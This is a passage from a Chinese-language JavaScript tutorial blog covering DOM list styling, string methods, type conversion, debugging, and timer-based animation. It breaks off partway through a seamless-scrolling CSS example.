不能给选择集设置样式属性</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//aLi.style.backgroundColor = 'gold';</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">        /*</span></span><br><span class="line"><span class="undefined">        同时给所有的li加背景色</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;iLen;i++)</span></span><br><span class="line"><span class="undefined">        &#123;</span></span><br><span class="line"><span class="javascript">            aLi[i].style.backgroundColor = <span class="string">'gold'</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">        */</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> oUl = <span class="built_in">document</span>.getElementById(<span class="string">'list1'</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> aLi2 = oUl.getElementsByTagName(<span class="string">'li'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> iLen2 = aLi2.length;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; iLen2; i++) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="javascript">                aLi2[i].style.backgroundColor = <span class="string">'gold'</span>;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"list1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>4<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>5<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>6<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>7<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>8<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"list2"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>4<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>5<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="9-11-Javascript组成"><a href="#9-11-Javascript组成" class="headerlink" title="9.11 Javascript组成"></a>9.11 Javascript组成</h2><p>1、ECMAscript javascript的语法（变量、函数、循环语句等语法）<br>2、DOM 文档对象模型 操作html和css的方法<br>3、BOM 浏览器对象模型 操作浏览器的一些方法</p><h2 id="9-12-字符串处理方法"><a href="#9-12-字符串处理方法" class="headerlink" title="9.12 字符串处理方法"></a>9.12 字符串处理方法</h2><p>1、字符串合并操作：“ + ”</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> iNum01 = <span class="number">12</span>;</span><br><span class="line"><span class="keyword">var</span> iNum02 = <span class="number">24</span>;</span><br><span class="line"><span class="keyword">var</span> sNum03 = <span class="string">'12'</span>;</span><br><span class="line"><span class="keyword">var</span> sTr = <span class="string">'abc'</span>;</span><br><span class="line">alert(iNum01+iNum02);  <span class="comment">//弹出36</span></span><br><span class="line">alert(iNum01+sNum03);  <span class="comment">//弹出1212 数字和字符串相加等同于字符串相加</span></span><br><span class="line">alert(sNum03+sTr);     <span class="comment">// 弹出12abc</span></span><br></pre></td></tr></table></figure><p>2、parseInt() 将数字字符串转化为整数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sNum01 = <span class="string">'12'</span>;</span><br><span class="line"><span class="keyword">var</span> sNum02 = <span class="string">'24'</span>;</span><br><span class="line"><span class="keyword">var</span> sNum03 = <span class="string">'12.32'</span>;</span><br><span class="line">alert(sNum01+sNum02);  <span class="comment">//弹出1224</span></span><br><span class="line">alert(<span class="built_in">parseInt</span>(sNum01)+<span class="built_in">parseInt</span>(sNum02))  <span class="comment">//弹出36</span></span><br><span class="line">alert(sNum03)   <span class="comment">//弹出数字12 将字符串小数转化为数字整数</span></span><br></pre></td></tr></table></figure><p>3、parseFloat() 将数字字符串转化为小数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sNum03 = <span class="string">'12.32'</span></span><br><span class="line">alert(<span class="built_in">parseFloat</span>(sNum03));  <span class="comment">//弹出 12.32 将字符串小数转化为数字小数</span></span><br></pre></td></tr></table></figure><p>4、split() 把一个字符串分隔成字符串组成的数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sTr = <span class="string">'2017-4-22'</span>;</span><br><span class="line"><span class="keyword">var</span> aRr = sTr.split(<span class="string">"-"</span>);</span><br><span class="line"><span class="keyword">var</span> aRr2= sTr.split(<span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">alert(aRr);  <span class="comment">//弹出['2017','4','2']</span></span><br><span class="line">alert(aRr2);  <span class="comment">//弹出['2','0','1','7','-','4','-','2','2']</span></span><br></pre></td></tr></table></figure><p>5、charAt() 获取字符串中的某一个字符</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sId = <span class="string">"#div1"</span>;</span><br><span class="line"><span class="keyword">var</span> sTr = sId.charAt(<span class="number">0</span>);</span><br><span class="line">alert(sTr); <span class="comment">//弹出 #</span></span><br></pre></td></tr></table></figure><p>6、indexOf() 查找字符串是否含有某字符</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sTr = <span class="string">"abcdefgh"</span>;</span><br><span class="line"><span class="keyword">var</span> iNum = sTr.indexOf(<span class="string">"c"</span>);</span><br><span class="line">alert(iNum); <span class="comment">//弹出2</span></span><br></pre></td></tr></table></figure><p>7、substring() 截取字符串 用法： substring(start,end)（不包括end）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sTr = <span class="string">"abcdefghijkl"</span>;</span><br><span class="line"><span class="keyword">var</span> sTr2 = sTr.substring(<span class="number">3</span>,<span class="number">5</span>);</span><br><span class="line"><span class="keyword">var</span> sTr3 = sTr.substring(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">alert(sTr2); <span class="comment">//弹出 de</span></span><br><span class="line">alert(sTr3); <span class="comment">//弹出 bcdefghijkl</span></span><br></pre></td></tr></table></figure><p>8、toUpperCase() 字符串转大写</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sTr = <span class="string">"abcdef"</span>;</span><br><span class="line"><span class="keyword">var</span> sTr2 = sTr.toUpperCase();</span><br><span class="line">alert(sTr2); <span class="comment">//弹出ABCDEF</span></span><br></pre></td></tr></table></figure><p>9、toLowerCase() 字符串转小写</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sTr = <span class="string">"ABCDEF"</span>;</span><br><span class="line"><span class="keyword">var</span> sTr2 = sTr.toLowerCase();</span><br><span class="line">alert(sTr2); <span class="comment">//弹出abcdef</span></span><br></pre></td></tr></table></figure><p><strong>字符串反转</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">'asdfj12jlsdkf098'</span>;</span><br><span class="line"><span class="keyword">var</span> str2 = str.split(<span class="string">''</span>).reverse().join(<span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">alert(str2);</span><br></pre></td></tr></table></figure><h2 id="9-13-类型转换"><a href="#9-13-类型转换" class="headerlink" title="9.13 类型转换"></a>9.13 类型转换</h2><p>1、直接转换 parseInt() 与 parseFloat()</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="string">'12'</span>+<span class="number">7</span>); <span class="comment">//弹出127</span></span><br><span class="line">alert( <span class="built_in">parseInt</span>(<span class="string">'12'</span>) + <span class="number">7</span> );  <span class="comment">//弹出19 </span></span><br><span class="line">alert( <span class="built_in">parseInt</span>(<span class="number">5.6</span>));  <span class="comment">// 弹出5</span></span><br><span class="line">alert(<span class="string">'5.6'</span>+<span class="number">2.3</span>);  <span class="comment">// 弹出5.62.3</span></span><br><span class="line">alert(<span class="built_in">parseFloat</span>(<span class="string">'5.6'</span>)+<span class="number">2.3</span>);  <span class="comment">// 弹出7.8999999999999995</span></span><br><span class="line">alert(<span class="number">0.1</span>+<span class="number">0.2</span>); <span class="comment">//弹出 0.3000000000000004</span></span><br><span class="line">alert((<span class="number">0.1</span>*<span class="number">100</span>+<span class="number">0.2</span>*<span class="number">100</span>)/<span class="number">100</span>); <span class="comment">//弹出0.3</span></span><br><span class="line">alert((<span class="built_in">parseFloat</span>(<span class="string">'5.6'</span>)*<span class="number">100</span>+<span class="number">2.3</span>*<span class="number">100</span>)/<span class="number">100</span>); <span class="comment">//弹出7.9</span></span><br></pre></td></tr></table></figure><p>2、隐式转换 “==” 和 “-”</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">'3'</span>==<span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">    alert(<span class="string">'相等'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 弹出'相等'</span></span><br><span class="line">alert(<span class="string">'10'</span><span class="number">-3</span>);  <span class="comment">// 弹出7</span></span><br></pre></td></tr></table></figure><p>3、NaN 和 isNaN</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert( <span class="built_in">parseInt</span>(<span class="string">'123abc'</span>) );  <span class="comment">// 弹出123</span></span><br><span class="line">alert( <span class="built_in">parseInt</span>(<span class="string">'abc123'</span>) );  <span class="comment">// 弹出NaN</span></span><br></pre></td></tr></table></figure><h2 id="9-14-调试程序的方法"><a href="#9-14-调试程序的方法" class="headerlink" title="9.14 调试程序的方法"></a>9.14 调试程序的方法</h2><p>1、alert</p><p>弹出的时候程序会卡住，也就是会阻止程序的运行</p><p>2、console.log</p><p>3、document.title</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 改变的是标签&lt;title&gt;的值</span></span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> iNum01 = <span class="number">20</span>;</span><br><span class="line">    setInterval(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        iNum01++;</span><br><span class="line">        <span class="built_in">document</span>.title = iNum01;</span><br><span class="line">    &#125;,<span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="9-15-定时器"><a href="#9-15-定时器" class="headerlink" title="9.15 定时器"></a>9.15 定时器</h2><h3 id="9-15-1-定时器在javascript中的作用"><a href="#9-15-1-定时器在javascript中的作用" class="headerlink" title="9.15.1 定时器在javascript中的作用"></a>9.15.1 <strong>定时器在javascript中的作用</strong></h3><p>1、制作动画<br>2、异步操作<br>3、函数缓冲与节流</p><p>定时器类型及语法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    定时器：</span></span><br><span class="line"><span class="comment">    setTimeout  只执行一次的定时器 </span></span><br><span class="line"><span class="comment">    clearTimeout 关闭只执行一次的定时器</span></span><br><span class="line"><span class="comment">    setInterval  反复执行的定时器</span></span><br><span class="line"><span class="comment">    clearInterval 关闭反复执行的定时器</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> time1 = setTimeout(myalert,<span class="number">2000</span>);</span><br><span class="line"><span class="keyword">var</span> time2 = setInterval(myalert,<span class="number">2000</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">clearTimeout(time1);</span></span><br><span class="line"><span class="comment">clearInterval(time2);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myalert</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="string">'ok!'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-15-2-课堂练习"><a href="#9-15-2-课堂练习" class="headerlink" title="9.15.2 课堂练习"></a>9.15.2 <strong>课堂练习</strong></h3><p>1、定时器制作移动动画</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> oDiv = <span class="built_in">document</span>.getElementById(<span class="string">'div1'</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> iLeft = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> iSpeed = <span class="number">3</span>;</span></span><br><span class="line"><span class="undefined">        /*</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> timer = setInterval(moving,<span class="number">30</span>);</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">moving</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="undefined">            iLeft += 3;</span></span><br><span class="line"><span class="javascript">            oDiv.style.left = iLeft + <span class="string">'px'</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">        */</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> timer = setInterval(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">            iLeft += iSpeed;</span></span><br><span class="line"><span class="javascript">            oDiv.style.left = iLeft + <span class="string">'px'</span>;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (iLeft &gt; <span class="number">700</span>) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// clearInterval(timer); // 定时器停止执行</span></span></span><br><span class="line"><span class="javascript">                iSpeed = <span class="number">-3</span>; <span class="comment">// 动画返回</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (iLeft &lt; <span class="number">0</span>) &#123; <span class="comment">// 动画返回之后再次折返过去</span></span></span><br><span class="line"><span class="undefined">                iSpeed = 3;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">        &#125;, 30);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.box</span> &#123;</span></span><br><span class="line"><span class="undefined">        width: 200px;</span></span><br><span class="line"><span class="undefined">        height: 200px;</span></span><br><span class="line"><span class="undefined">        background-color: gold;</span></span><br><span class="line"><span class="undefined">        position: absolute;</span></span><br><span class="line"><span class="undefined">        left: 0;</span></span><br><span class="line"><span class="undefined">        top: 100px;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"div1"</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2、定时器制作无缝滚动</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>无缝滚动<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">        *&#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">margin</span><span class="selector-pseudo">:0</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">padding</span><span class="selector-pseudo">:0</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.list_con</span>&#123;</span></span><br><span class="line"><span class="undefined">            </span></span><br><span class="line"><span class="css">            <span class="selector-tag">width</span><span class="selector-pseudo">:1000px</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">height</span><span class="selector-pseudo">:200px</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">border</span><span class="selector-pseudo">:1px</span> <span class="selector-tag">solid</span> <span class="selector-id">#000</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">margin</span><span class="selector-pseudo">:10px</span> <span class="selector-tag">auto</span> 0;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">background-color</span>:<span class="selector-id">#f0f0f0</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">position</span><span class="selector-pseudo">:relative</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">overflow</span><span class="selector-pseudo">:hidden</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.list_con</span> <span class="selector-tag">ul</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">list-style</span><span class="selector-pseudo">:none</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">width</span><span class="selector-pseudo">:2000px</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">height</span><span class="selector-pseudo">:200px</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">position</span><span class="selector-pseudo">:absolute</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">left</span><span class="selector-pseudo">:0</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">top</span><span class="selector-pseudo">:0</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.list_con</span> <span class="selector-tag">li</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">width</span><span class="selector-pseudo">:180px</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">height</span><span class="selector-pseudo">:180px</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">float</span><span class="selector-pseudo">:left</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">margin</span><span class="selector-pseudo">:10px</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.btns_con</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">width</span><span class="selector-pseudo">:1000px</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">height</span><span class="selector-pseudo">:30px</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">margin</span><span class="selector-pseudo">:50px</span> <span class="selector-tag">auto</span> 0;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">position</span><span class="selector-pseudo">:relative</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.left</span>,<span class="selector-class">.right</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">width</span><span class="selector-pseudo">:30px</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">height</span><span class="selector-pseudo">:30px</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">background-color</span><span class="selector-pseudo">:gold</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">position</span><span class="selector-pseudo">:absolute</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">left</span><span class="selector-pseudo">:-40px</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">top</span><span class="selector-pseudo">:124px</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">font-size</span><span class="selector-pseudo">:30px</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">line-height</span><span class="selector-pseudo">:30px</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">color</span>:<span class="selector-id">#000</span>;</span></span><br><span class="line"><span class="undefined">            font-family: 'Arial';</span></span><br><span class="line"><span class="css">            <span class="selector-tag">text-align</span><span class="selector-pseudo">:center</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">cursor</span><span class="selector-pseudo">:pointer</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">border-radius</span><span class="selector-pseudo">:15px</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">opacity</span><span class="selector-pseudo">:0.5</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.right</span>&#123;</span></span><br><span class="line"><span class="css">            